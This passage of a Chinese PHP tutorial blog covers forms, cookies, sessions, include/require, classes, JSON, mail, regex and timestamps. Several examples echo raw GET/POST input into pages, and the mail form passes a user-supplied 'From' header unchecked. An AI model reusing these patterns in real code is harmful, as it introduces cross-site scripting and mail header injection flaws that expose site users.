class="line">        &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Submit&quot;&gt;</span><br><span class="line">    &lt;&#x2F;form&gt;</span><br><span class="line">    &lt;hr&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$name &#x3D; $_GET[&quot;name&quot;]; &#x2F;&#x2F; 换成 $_POST</span><br><span class="line">$mail &#x3D; $_GET[&quot;mail&quot;];</span><br><span class="line"></span><br><span class="line">echo &quot;Name is: $name, Mail is: $mail&quot;;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;hr&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$name &#x3D; &quot;&quot;;</span><br><span class="line">$mail &#x3D; &quot;&quot;;</span><br><span class="line"></span><br><span class="line">if ($_SERVER[&quot;REQUEST_METHOD&quot;] &#x3D;&#x3D; &quot;GET&quot;) &#123; &#x2F;&#x2F; GET or POST</span><br><span class="line">    $name &#x3D; $_GET[&quot;name&quot;];</span><br><span class="line">    $mail &#x3D; $_GET[&quot;mail&quot;];</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $name &#x3D; $_POST[&quot;name&quot;];</span><br><span class="line">    $mail &#x3D; $_POST[&quot;mail&quot;];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo &quot;Request method: &#123;$_SERVER[&quot;REQUEST_METHOD&quot;]&#125;&lt;br&gt;&quot;;</span><br><span class="line">echo &quot;Name is: $name, Mail is: $mail&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><h2 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h2><p><code>设置 cookie</code>: setcookie(name, value, expire, path, domain)<br><code>取得 cookie</code>: $_COOKIE[name]<br><code>删除 cookie</code>: setcookie(name, “”, time()-3600) 设置 cookie 过期就可以了<br><code>测试 cookie</code>: isset($_COOKIE[name])</p><h3 id="设置-cookie-的页面"><a href="#设置-cookie-的页面" class="headerlink" title="设置 cookie 的页面"></a><code>设置 cookie 的页面</code></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">setcookie(&quot;user&quot;, &quot;Bob&quot;, time() + 3600); &#x2F;&#x2F; 必须在 html 的内容前面设置 cookie</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><h3 id="访问-cookie-的页面"><a href="#访问-cookie-的页面" class="headerlink" title="访问 cookie 的页面"></a><code>访问 cookie 的页面</code></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">echo $_COOKIE[&quot;user&quot;];</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">if (isset($_COOKIE[&quot;mail&quot;])) &#123;</span><br><span class="line">    echo $_COOKIE[&quot;mail&quot;];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><h2 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h2><p>使用 session 前必须<code>启动 session</code>: session_start()<br><code>设置 session</code>: $_SESSION[name]=value<br><code>取得 session</code>: $_SESSION[name]<br><code>删除 session</code>: unset($_SESSION[name])，session_destroy()<br><code>测试 session</code>: isset($\ _SESSION[name])</p><h3 id="设置-session-的页面"><a href="#设置-session-的页面" class="headerlink" title="设置 session 的页面"></a><code>设置 session 的页面</code></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start(); &#x2F;&#x2F; 必须在 html 的内容前面设置 cookie</span><br><span class="line">$_SESSION[&#39;number&#39;]&#x3D;1;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><h3 id="访问-session-的页面"><a href="#访问-session-的页面" class="headerlink" title="访问 session 的页面"></a><code>访问 session 的页面</code></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start(); &#x2F;&#x2F; 必须在 html 的内容前面设置 cookie</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">echo $_SESSION[&quot;number&quot;];</span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><h2 id="Include-Require-文件"><a href="#Include-Require-文件" class="headerlink" title="Include / Require 文件"></a>Include / Require 文件</h2><blockquote><p>通过 include 或 require 语句，可以将 PHP 文件的内容插入另一个 PHP 文件（在服务器执行它之前）。<br>include 和 require 语句是相同的，除了错误处理方面：</p></blockquote><ul><li><p>require 会生成致命错误（E_COMPILE_ERROR）并停止脚本</p></li><li><p>include 只生成警告（E_WARNING），并且脚本会继续</p><blockquote><p>因此，如果您希望继续执行，并向用户输出结果，<code>即使包含文件已丢失，那么请使用 include</code>。否则，在框架、CMS 或者复杂的 PHP 应用程序编程中，请始终使用 require 向执行流引用关键文件。这有助于提高应用程序的安全性和完整性，在某个关键文件意外丢失的情况下。<br>包含文件省去了大量的工作。这意味着您可以为所有页面创建标准页头、页脚或者菜单文件。然后，在页头需要更新时，您只需更新这个页头包含文件即可。</p></blockquote></li></ul><p><code>include &#39;filename&#39;;</code><br><code>require &#39;filename&#39;;</code><br><code>include_once(&quot;fileName&quot;);</code><br><code>require_once(&quot;fileName&quot;);</code> 括号可要可不要 类的定义推荐用 require_once</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- footer.php --&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;Copyright © 2006-"</span> . date(<span class="string">"Y"</span>) . <span class="string">" W3School.com.cn&lt;/p&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- hello.php --&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">include</span> <span class="string">'header1.php'</span>;<span class="meta">?&gt;</span>&lt;/body&gt;</span><br><span class="line">    &lt;h1&gt;Hello World!&lt;/h1&gt;</span><br><span class="line">    &lt;p&gt;Section <span class="number">1</span>&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;Section <span class="number">2</span>&lt;/p&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">require</span> <span class="string">'footer.php'</span>;<span class="meta">?&gt;</span>&lt;/body&gt;</span><br><span class="line">    &lt;p&gt;End&lt;/p&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h2 id="PHP-的面向对象：类，和-Java-的类很像"><a href="#PHP-的面向对象：类，和-Java-的类很像" class="headerlink" title="PHP 的面向对象：类，和 Java 的类很像"></a>PHP 的面向对象：类，和 Java 的类很像</h2><ul><li>类的定义：<code>class className {}</code> 没有访问权限一说</li><li>成员变量定义：<code>[qualifier|var] $field;</code> 可以初始化</li><li>成员函数定义：<code>[qualifier] function methodName() {}</code>，可带参数</li><li>构造函数：<code>__construct() {}</code>，可带参数</li><li>创建对象：<code>$obj = new className();</code>，<code>$obj = new className($v1,$v2);</code></li><li>函数调用：<code>$obj-&gt;methodName();</code></li><li>成员函数内访问成员变量：<code>$this-&gt;fieldName</code> 不是 $this-&gt;$fieldName</li><li>成员函数内访问成员函数：<code>$this-&gt;methodName()</code></li><li>PHP 不会自动调用父类的构造函数(不支持构造函数重载，可以使用默认参数实现重载)，必须使用 <code>parent</code> 关键字显式地调用</li><li>PHP 只支持<code>单继承</code>，使用关键字 <code>extends</code></li><li>PHP 也有<code>接口</code>，使用关键字 <code>interface</code> 定义接口，实现接口使用关键字 <code>implements</code></li><li>接口的方法没有实现会报错</li><li>访问权限 <code>qualifier</code>：<code>public</code>, <code>protected</code>, <code>private</code>, <code>abstract</code>, <code>final</code>, <code>static</code>。<code>默认是 public</code> 的访问权限</li><li>可以把类的定义放在单独的文件里，然后使用 <code>require_once</code> 加载</li></ul><h3 id="类定义和继承"><a href="#类定义和继承" class="headerlink" title="类定义和继承"></a><code>类定义和继承</code></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">class Employee &#123;</span><br><span class="line">    var $name;</span><br><span class="line">    var $salary;</span><br><span class="line">    protected $id;</span><br><span class="line"></span><br><span class="line">    function __construct($name, $salary) &#123; &#x2F;&#x2F; 构造函数</span><br><span class="line">        $this-&gt;name &#x3D; $name;</span><br><span class="line">        $this-&gt;salary &#x3D; $salary;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getName() &#123;</span><br><span class="line">        return $this-&gt;name; &#x2F;&#x2F; 不能直接用 return $name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setName($name) &#123;</span><br><span class="line">        $this-&gt;name &#x3D; $name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$employee &#x3D; new Employee(&quot;Alice&quot;, 2000);</span><br><span class="line">echo $employee-&gt;getName() . &quot;&lt;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">$employee-&gt;setName(&quot;Bob&quot;);</span><br><span class="line">echo $employee-&gt;getName() . &quot;&lt;br&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F; 使用继承</span><br><span class="line">class Manager extends Employee &#123;</span><br><span class="line">    var $title;</span><br><span class="line"></span><br><span class="line">    function __construct($name, $salary, $title) &#123;</span><br><span class="line">        parent::__construct($name, $salary); &#x2F;&#x2F; 调用父类的构造函数</span><br><span class="line">        $this-&gt;title &#x3D; $title;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getTitle() &#123;</span><br><span class="line">        return $this-&gt;title;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$manager &#x3D; new Manager(&quot;Alice&quot;, 3000, &quot;Project Manager&quot;);</span><br><span class="line">echo $manager-&gt;getName() . &quot;, &quot; . $manager-&gt;getTitle() . &quot;&lt;br&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><h3 id="实现接口"><a href="#实现接口" class="headerlink" title="实现接口"></a><code>实现接口</code></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">interface Flyable &#123;</span><br><span class="line">    function fly();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface Runnable &#123;</span><br><span class="line">    function run();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Bird implements Flyable, Runnable &#123;</span><br><span class="line">    function fly() &#123;</span><br><span class="line">        echo &quot;I can fly.&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function run() &#123;</span><br><span class="line">        echo &quot;I can run.&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$bird &#x3D; new Bird();</span><br><span class="line">$bird-&gt;fly();</span><br><span class="line">$bird-&gt;run();</span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><h3 id="静态访问-关键字-self"><a href="#静态访问-关键字-self" class="headerlink" title="静态访问 关键字 self"></a><code>静态访问</code> 关键字 self</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">class Test &#123;</span><br><span class="line">    public static $count &#x3D; 0;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 每创建一个对象 count 就加 1</span><br><span class="line">    function __construct() &#123;</span><br><span class="line">        self::$count++; &#x2F;&#x2F; 函数内部访问静态成员</span><br><span class="line">        echo self::$count . &quot; instances are created.&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    static function getCount() &#123;</span><br><span class="line">        return self::$count;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo Test::getCount() . &quot;&lt;br&gt;&quot;; &#x2F;&#x2F; 类外部访问静态成员函数</span><br><span class="line">new Test();</span><br><span class="line">new Test();</span><br><span class="line">new Test();</span><br><span class="line">echo Test::getCount() . &quot;&lt;br&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><h2 id="实用代码"><a href="#实用代码" class="headerlink" title="实用代码"></a>实用代码</h2><h3 id="Array-to-JSON"><a href="#Array-to-JSON" class="headerlink" title="Array to JSON"></a>Array to JSON</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$props = <span class="keyword">array</span>(<span class="string">"background"</span>=&gt;<span class="string">"black"</span>, <span class="string">"width"</span>=&gt;<span class="number">300</span>, <span class="string">"height"</span>=&gt;<span class="number">600</span>);</span><br><span class="line"><span class="keyword">echo</span> json_encode($props); <span class="comment">// &#123;"background":"black","width":300,"height":600&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="取得正在访问的网页的网址"><a href="#取得正在访问的网页的网址" class="headerlink" title="取得正在访问的网页的网址"></a>取得正在访问的网页的网址</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$url = <span class="string">"http://"</span>.$_SERVER[<span class="string">'HTTP_HOST'</span>].$_SERVER[<span class="string">'PHP_SELF'</span>];</span><br><span class="line"><span class="keyword">echo</span> $url . <span class="string">"&lt;br&gt;"</span>; <span class="comment">// http://localhost:8000/hello.php</span></span><br><span class="line"></span><br><span class="line">$name = dirname($url);</span><br><span class="line"><span class="keyword">echo</span> $name . <span class="string">"&lt;br&gt;"</span>; <span class="comment">// http://localhost:8000</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="使用-PHP-发邮件"><a href="#使用-PHP-发邮件" class="headerlink" title="使用 PHP 发邮件"></a>使用 PHP 发邮件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;content-type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;UTF-8&quot; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form action&#x3D;&quot;hello.php&quot; method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">        &lt;table&gt;</span><br><span class="line">            &lt;tr&gt;</span><br><span class="line">                &lt;td&gt;Mail to:&lt;&#x2F;td&gt;</span><br><span class="line">                &lt;td&gt;&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;mail_to&quot; &#x2F;&gt;&lt;&#x2F;td&gt;</span><br><span class="line">            &lt;&#x2F;tr&gt;</span><br><span class="line">            &lt;tr&gt;</span><br><span class="line">                &lt;td&gt;Subject:&lt;&#x2F;td&gt;</span><br><span class="line">                &lt;td&gt;&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;subject&quot; &#x2F;&gt;&lt;&#x2F;td&gt;</span><br><span class="line">            &lt;&#x2F;tr&gt;</span><br><span class="line">            &lt;tr&gt;</span><br><span class="line">                &lt;td&gt;Mail From:&lt;&#x2F;td&gt;</span><br><span class="line">                &lt;td&gt;&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;mail_from&quot; &#x2F;&gt;&lt;&#x2F;td&gt;</span><br><span class="line">            &lt;&#x2F;tr&gt;</span><br><span class="line">            &lt;tr&gt;</span><br><span class="line">                &lt;td colspan&#x3D;&quot;2&quot;&gt;&lt;textarea name&#x3D;&quot;contents&quot; cols&#x3D;&quot;50&quot; rows&#x3D;&quot;10&quot;&gt;&lt;&#x2F;textarea&gt;&lt;&#x2F;td&gt;</span><br><span class="line">            &lt;&#x2F;tr&gt;</span><br><span class="line">            &lt;tr&gt;</span><br><span class="line">                &lt;td colspan&#x3D;&quot;2&quot; align&#x3D;&quot;center&quot;&gt;&lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Send Mail&quot;&#x2F;&gt;&lt;&#x2F;td&gt;</span><br><span class="line">            &lt;&#x2F;tr&gt;</span><br><span class="line">        &lt;&#x2F;table&gt;</span><br><span class="line">    &lt;&#x2F;form&gt;</span><br><span class="line"></span><br><span class="line">    &lt;?php</span><br><span class="line">        $mailTo &#x3D; $_POST[&quot;mail_to&quot;];</span><br><span class="line">        $mailFrom &#x3D; $_POST[&quot;mail_from&quot;];</span><br><span class="line">        $subject &#x3D; $_POST[&quot;subject&quot;];</span><br><span class="line">        $contents &#x3D; $_POST[&quot;contents&quot;];</span><br><span class="line"></span><br><span class="line">        if ($mailTo &amp;&amp; $mailFrom &amp;&amp; $subject &amp;&amp; $contents) &#123;</span><br><span class="line">            &#x2F;&#x2F; 前面那些HTML代码都是为了填写信息更容易，实际发送邮件代码只是下面一句</span><br><span class="line">            &#x2F;&#x2F; 但首先机器上得启动邮件发送程序，Mac下是默认启动的，Linux好像要自己先配置启动</span><br><span class="line">            mail($mailTo, $subject, $contents, &quot;From:&quot;.$mailFrom);</span><br><span class="line">            echo &quot;Mail is successfully sent!&quot;, &quot;&lt;br&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    ?&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><h3 id="PHP中的非贪婪匹配，默认用的是贪婪匹配"><a href="#PHP中的非贪婪匹配，默认用的是贪婪匹配" class="headerlink" title="PHP中的非贪婪匹配，默认用的是贪婪匹配"></a>PHP中的非贪婪匹配，默认用的是贪婪匹配</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;pre&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 替换图片的目录为统一路径</span></span><br><span class="line">$string = <span class="string">'a&lt;img src="a/b/x.png"&gt;,Biao,&lt;img src="uploads/y.jpg"&gt;'</span>;</span><br><span class="line">$string2 = <span class="string">'a&lt;img src="a/b/x.png"&gt;,Biao,&lt;img src="uploads/y.jpg"&gt;'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// /U为非贪婪，这种非贪婪，是从后面向前找，与+?有些区别</span></span><br><span class="line">$pattern =<span class="string">'/&lt;img src="(.*)\/(.+\\..+)"&gt;/U'</span>;</span><br><span class="line">$replacement = <span class="string">"&lt;img src=\"__IMG_BASE__/$2\"&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> preg_replace($pattern, $replacement, $string);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"-------------"</span>;</span><br><span class="line"></span><br><span class="line">$pattern =<span class="string">'/&lt;img src="(.*)\/(.+\\..+)"&gt;+?/'</span>; <span class="comment">// +?结果与上面的不一样</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> preg_replace($pattern, $replacement, $string2);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"-------------"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 找出所有的图片，图片名</span></span><br><span class="line">$pattern =<span class="string">"/&lt;img src=\"(.*)\/(.+\\..+)\"&gt;/U"</span>;</span><br><span class="line">preg_match_all($pattern, $string, $images);</span><br><span class="line">print_r($images);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出图片名</span></span><br><span class="line"><span class="keyword">foreach</span> ($images[<span class="number">2</span>] <span class="keyword">as</span> $index =&gt; $imageName) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"$imageName&lt;br/&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="字符串和timestamp的转换-Date-Document"><a href="#字符串和timestamp的转换-Date-Document" class="headerlink" title="字符串和timestamp的转换 Date Document"></a>字符串和timestamp的转换 <a href="http://php.net/manual/en/function.date.php" target="_blank" rel="noopener">Date Document</a></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> (strtotime(<span class="string">"2010-10-28 10:52:21"</span>)); <span class="comment">// MySQL格式的字符串转换成秒数</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> (strtotime(<span class="string">"2010-10-01 00:00:00"</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">$d = date(<span class="string">"Y-m-d H:i:s"</span>, time()); <span class="comment">// 秒数转换成MySQL格式的timestamp</span></span><br><span class="line"><span class="keyword">echo</span> $d;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="访问-MySQL"><a href="#访问-MySQL" class="headerlink" title="访问 MySQL"></a>访问 MySQL</h3><figure 